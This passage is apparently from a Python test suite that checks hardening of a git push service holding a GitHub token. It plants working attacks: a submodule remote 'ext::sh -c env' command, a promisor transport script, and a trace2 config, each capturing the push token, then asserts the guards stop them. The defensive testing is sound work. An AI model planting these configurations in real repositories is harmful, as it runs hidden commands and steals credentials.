                c for c in _common.WORKSPACE_GIT_TRANSPORT_CONFIG if not c.startswith("protocol.")
            ),
        )


_IDENT = ["-c", "user.name=t", "-c", "user.email=t@t"]


def _add_submodule(ws: _RealWorkspace) -> Path:
    """An embedded repo at ``sub/`` registered as a submodule and committed as a
    gitlink, with a remote-tracking ref (``on-demand`` only pushes a submodule that
    has one) and a second commit that is not on it."""
    sub = ws.repo / "sub"
    subprocess.run([_GIT, "init", "-q", "-b", "main", str(sub)], check=True, env=ws.env)
    (sub / "s.txt").write_text("s\n")
    subprocess.run([_GIT, "-C", str(sub), "add", "s.txt"], check=True, env=ws.env)
    subprocess.run([_GIT, "-C", str(sub), *_IDENT, "commit", "-qm", "s"], check=True, env=ws.env)
    subprocess.run(
        [_GIT, "-C", str(sub), "update-ref", "refs/remotes/origin/main", "HEAD"],
        check=True,
        env=ws.env,
    )
    (sub / "t.txt").write_text("t\n")
    subprocess.run([_GIT, "-C", str(sub), "add", "t.txt"], check=True, env=ws.env)
    subprocess.run([_GIT, "-C", str(sub), *_IDENT, "commit", "-qm", "t"], check=True, env=ws.env)
    _git(ws, "-c", "protocol.file.allow=always", "submodule", "add", "-q", "./sub", "sub")
    return sub


def _plant_recursing_submodule(ws: _RealWorkspace, tmp_path: Path) -> Path:
    """The auditor's exact setup. Returns the marker the ``ext::`` command writes
    (``env`` output, so it holds ``$GIT_PUSH_TOKEN`` if the command saw it).

    Arming control: plain ``git push`` of the branch to a fresh bare repo, with the
    token in the environment, runs the planted command and exposes the token."""
    marker = tmp_path / "submodule-ext.ran"
    sub = _add_submodule(ws)
    for key, value in (
        ("branch.main.remote", "origin"),
        ("branch.main.merge", "refs/heads/main"),
        ("remote.origin.url", f"ext::sh -c env% >{marker}"),
        ("protocol.ext.allow", "always"),
    ):
        subprocess.run([_GIT, "-C", str(sub), "config", key, value], check=True, env=ws.env)
    _git(ws, *_IDENT, "commit", "-qm", "add submodule")
    _git(ws, "config", "push.recurseSubmodules", "on-demand")

    arming = tmp_path / "arming.git"
    subprocess.run([_GIT, "init", "-q", "--bare", str(arming)], check=True, env=ws.env)
    subprocess.run(
        [_GIT, "-C", str(ws.repo), "push", str(arming), "refs/heads/main:refs/heads/main"],
        capture_output=True,
        env={**ws.env, gp._TOKEN_ENV: _TOKEN},
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert marker.exists(), "fixture not armed: git push did not recurse into the submodule"
    assert _TOKEN in marker.read_text(), "fixture not armed: the command did not see the token"
    marker.unlink()
    ws.push_to = str(tmp_path / "github-stand-in.git")
    subprocess.run([_GIT, "init", "-q", "--bare", ws.push_to], check=True, env=ws.env)
    return marker


@pytest.mark.asyncio
@pytest.mark.parametrize("layer", SUBMODULE_LAYERS)
async def test_push_never_runs_a_submodule_transport_with_the_token(
    app, client, workspace, tmp_path, monkeypatch, layer
):
    from src.routers.containers import _common

    marker = _plant_recursing_submodule(workspace, tmp_path)
    monkeypatch.setattr(gp, "_config_guard_command", lambda: "exit 1")  # guard blind
    monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", False)  # refusal blind
    _submodule_layers(monkeypatch, layer)

    response = await _post(app, client, workspace)

    (push,) = workspace.pushes()  # the real push ran, with the token in its env
    assert push["has_token"] is True
    if layer == "neither":
        # Arming control: without either layer the attack is real.
        assert marker.exists() and _TOKEN in marker.read_text()
        return
    assert not marker.exists(), "a submodule transport ran inside the token-holding push"
    if layer in ("both", "recursion_only"):
        assert response.status_code == 200, response.text
        landed = subprocess.run(
            [_GIT, "-C", workspace.push_to, "rev-parse", "refs/heads/main"],
            capture_output=True,
            text=True,
            env=workspace.env,
        )
        assert landed.returncode == 0, "the honest part of the push did not land"
    else:  # protocol_only: git tried to recurse, the transport was refused
        assert response.status_code != 200, response.text


@pytest.mark.asyncio
async def test_the_submodule_refusal_stops_the_attack_before_any_push(
    app, client, workspace, tmp_path, monkeypatch
):
    """First layer (coordinator ruling: submodules unsupported): the auditor's workspace
    is refused 409 before the token-holding exec, even with the config guard blind."""
    marker = _plant_recursing_submodule(workspace, tmp_path)
    monkeypatch.setattr(gp, "_config_guard_command", lambda: "exit 1")
    response = await _post(app, client, workspace)
    assert response.status_code == 409, response.text
    assert response.json()["error"]["message"].startswith("workspace_submodules_unsupported")
    assert workspace.pushes() == []
    assert all(env is None for _cmd, env in workspace.calls), "token left the process"
    assert not marker.exists()


#: Which ``log`` layer is kept: the ``--ignore-submodules=none`` flag, the
#: ``-c diff.ignoreSubmodules=none`` pin, both, or neither.
LOG_LAYERS = ["both", "flag_only", "config_only", "neither"]


@pytest.mark.parametrize("hide", ["config", "gitmodules"])
@pytest.mark.parametrize("layer", LOG_LAYERS)
def test_a_pushed_gitlink_is_listed_whatever_the_workspace_ignores(
    workspace, monkeypatch, hide, layer
):
    """``diff.ignoreSubmodules=all`` (config) or ``submodule.<n>.ignore=all``
    (``.gitmodules``) must not hide a pushed gitlink from the ``target_files`` path
    check. The ``.gitmodules`` route is not overridden by the config pin: only the
    flag holds it (so ``config_only`` x ``gitmodules`` is expected to be blind)."""
    from src.routers.containers import _common

    monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", False)  # refusal blind
    ws = workspace
    base = subprocess.run(
        [_GIT, "-C", str(ws.repo), "rev-parse", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
        env=ws.env,
    ).stdout.strip()
    _add_submodule(ws)
    if hide == "gitmodules":
        _git(ws, "config", "-f", ".gitmodules", "submodule.sub.ignore", "all")
        _git(ws, "add", ".gitmodules")
    _git(ws, *_IDENT, "commit", "-qm", "add submodule")
    if hide == "config":
        _git(ws, "config", "diff.ignoreSubmodules", "all")
    plain = subprocess.run(
        [_GIT, "-C", str(ws.repo), "log", "--name-only", "--format=", f"{base}..HEAD"],
        capture_output=True,
        text=True,
        check=True,
        env=ws.env,
    ).stdout.split()
    assert "sub" not in plain, "fixture not armed: plain log still lists the gitlink"
    if layer in ("config_only", "neither"):
        monkeypatch.setattr(gp, "_LOG_IGNORE_SUBMODULES_FLAG", "")
    if layer in ("flag_only", "neither"):
        monkeypatch.setattr(gp, "_LOG_IGNORE_SUBMODULES_CONFIG", "")

    out = subprocess.run(
        ["sh", "-c", gp._pushed_paths_command("main", base)],
        capture_output=True,
        text=True,
        env=ws.env,
    )
    assert out.returncode == 0, out.stderr
    parsed = gp._parse_listing(out.stdout)
    assert parsed is not None
    _tip, paths = parsed

    visible = layer in ("both", "flag_only") or (layer == "config_only" and hide == "config")
    assert ("sub" in paths) is visible, paths


def test_every_workspace_git_carries_the_submodule_and_transport_pins():
    """String-level pin for the sites no behavioural test above arms (status, switch,
    restore, ls-files, rev-list, update-ref, branch --set-upstream-to, the listing)."""
    from src.routers.containers import _common

    assert "GIT_ALLOW_PROTOCOL=" in _common.WORKSPACE_GIT_ENV
    for pair in _common.WORKSPACE_GIT_TRANSPORT_CONFIG:
        assert pair in gp._hardened_git()
        assert pair in _common.workspace_git_read(["status"])
        assert pair in _common.workspace_git_mutate(["switch", "x"])
        assert pair in _common.workspace_git_function("_g")
        assert pair in gp._push_command(_OWNER, _REPO, "main", "a" * 40, force=False)
        # The guard lists command-line config too, and refuses these very keys.
        assert pair not in gp._config_guard_command()
    cmd = gp._push_command(_OWNER, _REPO, "main", "a" * 40, force=False)
    assert "GIT_ALLOW_PROTOCOL=https" in cmd
    assert " push --no-recurse-submodules " in cmd


# ---------------------------------------------------------------------------
# 6. The push exec's FIRST git (the submodule/poison check) never lazy-fetches
# ---------------------------------------------------------------------------
#
# Reproduced (validator on #157, against 278155c): the push exec ran
# ``workspace_poison_check()`` -- whose ``_nosub_tree`` lists ``HEAD^{tree}`` -- BEFORE
# exporting ``GIT_NO_LAZY_FETCH``/``GIT_ALLOW_PROTOCOL``, with ``$GIT_PUSH_TOKEN``
# already in the environment. A partial clone planted after the route's guard exec,
# missing one HEAD subtree, made that listing lazily fetch through a promisor whose
# transport (``core.sshCommand`` for ``ssh://``, ``core.gitProxy`` for ``git://``) ran
# with the token. The push exec's own config guard comes after the check, too late.


def _lazy_subtree_workspace(tmp_path: Path, scheme: str) -> tuple[Path, Path, dict[str, str]]:
    """A repo whose HEAD tree names a MISSING subtree, as a partial clone whose
    promisor remote's transport is a marker script (records whether the token was in
    its environment). Returns (repo, marker, env). Arming control included."""
    root = tmp_path / f"lazy-{scheme}"
    root.mkdir()
    env = _base_env(root)
    repo = root / "ws"
    subprocess.run([_GIT, "init", "-q", "-b", "main", str(repo)], check=True, env=env)
    (repo / "d").mkdir()
    (repo / "d" / "y.txt").write_text("y\n")
    subprocess.run([_GIT, "-C", str(repo), "add", "d"], check=True, env=env)
    subprocess.run(
        [_GIT, "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "d"],
        check=True,
        env=env,
    )
    sub = subprocess.run(
        [_GIT, "-C", str(repo), "rev-parse", "HEAD:d"],
        capture_output=True,
        text=True,
        check=True,
        env=env,
    ).stdout.strip()
    (repo / ".git" / "objects" / sub[:2] / sub[2:]).unlink()
    marker = root / "transport.ran"
    script = root / "transport.sh"
    script.write_text(f'#!/bin/sh\necho "token=${{{gp._TOKEN_ENV}:-}}" >> "{marker}"\nexit 1\n')
    script.chmod(0o755)
    for key, value in [
        ("core.repositoryformatversion", "1"),
        ("extensions.partialClone", "evil"),
        ("remote.evil.url", f"{scheme}://h.invalid/x"),
        ("remote.evil.promisor", "true"),
        (f"protocol.{scheme}.allow", "always"),
        ("core.sshCommand", str(script)),
        ("core.gitProxy", str(script)),
    ]:
        subprocess.run([_GIT, "-C", str(repo), "config", key, value], check=True, env=env)
    # Arming control: a plain listing of HEAD's tree lazily fetches and runs the script.
    subprocess.run(
        [_GIT, "-C", str(repo), "ls-tree", "-r", "HEAD^{tree}"],
        capture_output=True,
        env=env,
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert marker.exists(), f"fixture not armed: ls-tree did not lazy-fetch ({scheme})"
    marker.unlink()
    return repo, marker, env


@pytest.mark.parametrize("scheme", ["ssh", "git"])
def test_push_exec_first_git_never_lazy_fetches_with_the_token(tmp_path, monkeypatch, scheme):
    repo, marker, env = _lazy_subtree_workspace(tmp_path, scheme)
    monkeypatch.setattr(gp, "_WORKDIR", str(repo))
    tip = subprocess.run(
        [_GIT, "-C", str(repo), "rev-parse", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
        env=env,
    ).stdout.strip()
    command = gp._push_command(_OWNER, _REPO, "main", tip, force=False)
    r = subprocess.run(
        ["sh", "-c", command],
        capture_output=True,
        text=True,
        env={**env, gp._TOKEN_ENV: _TOKEN},
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert not marker.exists(), (
        f"the promisor transport ran in the push exec: {marker.read_text()!r}"
    )
    # Refused before any push: the missing subtree cannot be listed (submodule check).
    from src.routers.containers import _common

    assert r.returncode == _common.WORKSPACE_SUBMODULES_EXIT, (r.returncode, r.stderr)
    assert _common.WORKSPACE_SUBMODULES in r.stderr


# ---------------------------------------------------------------------------
# 7. A workspace trace2 config never writes the token to a file
# ---------------------------------------------------------------------------
#
# Reproduced (audit on #157, git 2.50): HOME is workspace-owned, so a global config
# (``~/.gitconfig`` or ``~/.config/git/config``) setting ``trace2.envVars=GIT_PUSH_TOKEN``
# + ``trace2.eventTarget=<file>`` made every git of the push exec that ran before
# ``GIT_CONFIG_GLOBAL=/dev/null`` -- the poison/submodule check and the config guard,
# which reads global scope by design -- write the token's VALUE into that file.
_PUSH_ONLY_STUB = """#!/bin/sh
# Every git runs for real; ``push`` is answered locally (no network in a unit test).
for a in "$@"; do [ "$a" = push ] && exit 0; done
exec "$REAL_GIT" "$@"
"""


@pytest.mark.parametrize("where", ["gitconfig", "xdg"])
@pytest.mark.parametrize("layer", ["both", "env_only", "neither"])
def test_a_trace2_config_never_writes_the_push_token(tmp_path, monkeypatch, where, layer):
    root = tmp_path / "r"
    root.mkdir()
    repo = _init_repo(root)
    env = _base_env(root)
    # The route re-points origin at the canonical URL before the push exec runs.
    subprocess.run(
        [_GIT, "-C", str(repo), "remote", "add", "origin", f"https://github.com/{_OWNER}/{_REPO}"],
        check=True,
        env=env,
    )
    home = Path(env["HOME"])
    cfg = home / ".gitconfig" if where == "gitconfig" else home / ".config" / "git" / "config"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    trace = tmp_path / "trace.json"
    cfg.write_text(f"[trace2]\n\tenvVars = {gp._TOKEN_ENV}\n\teventTarget = {trace}\n")
    # Arming control: a plain git under this HOME writes the token to the target.
    subprocess.run(
        [_GIT, "-C", str(repo), "status"],
        capture_output=True,
        env={**env, gp._TOKEN_ENV: _TOKEN},
        check=True,
    )
    assert _TOKEN in trace.read_text(), "fixture not armed: trace2 did not record the token"
    trace.unlink()

    shim_dir = tmp_path / "shim"
    shim_dir.mkdir()
    (shim_dir / "git").write_text(_PUSH_ONLY_STUB)
    (shim_dir / "git").chmod(0o755)
    monkeypatch.setattr(gp, "_WORKDIR", str(repo))
    if layer != "both":  # the guard's trace2 refusal off: the exec runs to the push
        monkeypatch.setattr(
            gp,
            "_DANGEROUS_CONFIG_RE",
            gp._DANGEROUS_CONFIG_RE.replace(f"|{gp._TRACE_CONFIG_RE}", ""),
        )
    if layer == "neither":  # mutation: the prelude without the GIT_TRACE2* exports
        monkeypatch.setattr(
            gp, "_PUSH_PRELUDE_KEYS", tuple(k for k in gp._PUSH_PRELUDE_KEYS if "TRACE" not in k)
        )
    tip = subprocess.run(
        [_GIT, "-C", str(repo), "rev-parse", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
        env=env,
    ).stdout.strip()
    r = subprocess.run(
        ["sh", "-c", gp._push_command(_OWNER, _REPO, "main", tip, force=False)],
        capture_output=True,
        text=True,
        env={
            **env,
            gp._TOKEN_ENV: _TOKEN,
            "PATH": f"{shim_dir}{os.pathsep}{env['PATH']}",
            "REAL_GIT": _GIT,
        },
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    leaked = trace.exists() and _TOKEN in trace.read_text()
    assert leaked is (layer == "neither"), (layer, r.returncode, r.stderr)
    if layer == "both":
        # Second layer: the guard names the key and refuses before the push.
        assert r.returncode == gp._CONFIG_EXIT, (r.returncode, r.stderr)
        assert "trace2.envvars" in r.stdout.lower()
    else:
        assert r.returncode == 0, (r.returncode, r.stdout, r.stderr)


def test_every_workspace_git_exports_trace2_off():
    """String-level pin: the shared list (every workspace exec) and the push prelude."""
    from src.routers.containers import _common

    for pair in ("GIT_TRACE2=0", "GIT_TRACE2_EVENT=0", "GIT_TRACE2_PERF=0"):
        assert pair in _common.WORKSPACE_GIT_ENV
        assert pair in _common.workspace_git_env()
        assert pair in gp._push_exec_prelude()
